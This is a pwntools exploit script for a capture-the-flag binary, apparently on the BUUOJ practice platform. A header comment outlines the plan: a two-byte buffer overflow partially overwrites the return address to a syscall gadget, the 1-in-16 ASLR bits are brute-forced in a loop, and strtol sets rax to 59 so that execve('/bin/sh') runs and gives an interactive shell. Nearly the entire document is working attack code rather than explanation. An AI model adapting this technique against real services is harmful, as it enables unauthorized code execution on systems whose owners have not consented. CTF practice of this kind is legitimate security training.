# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    vuln: buffer overflow 2 bytes
exp:
1.strtol control rax as 59 to syscall execve("/bin/sh", 0, 0)
2.buffer overflow to brute force the 1/16 probability of the 4th least 4 bits of ASLR
3.syscall_gadget at 0x0000000000000899 control rsi and rdx as 0
'''
from pwn import *


# define the context
binary_name = './xxx'
libc_name = './ubuntu20-libc-2.30-x64.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.30-0ubuntu2_amd64/libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
if binary_name:
    context.binary = elf 
    context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# exploiting code
while True:
    # define the io object
    if args.REMOTE:
        io = remote('node5.buuoj.cn', 28321)
    elif args.GDB:
        io = gdb.debug(binary_name, gdbscript="""
            brva 0x2333
            c
        """, aslr=False)
    else:
        io = process(binary_name)

    payload = flat({
        0x00: b'59/bin/sh\x00',
        0x38: p16(0x0899),
    })

    sa(b'if you give me your number,i will give you some hao_kang_de\n', payload)
    sla(b'to say?\n', b'you are homo')
    try:
        rc(timeout=1)
        break
    except:
        io.close()

# interact with the shell
io.interactive()
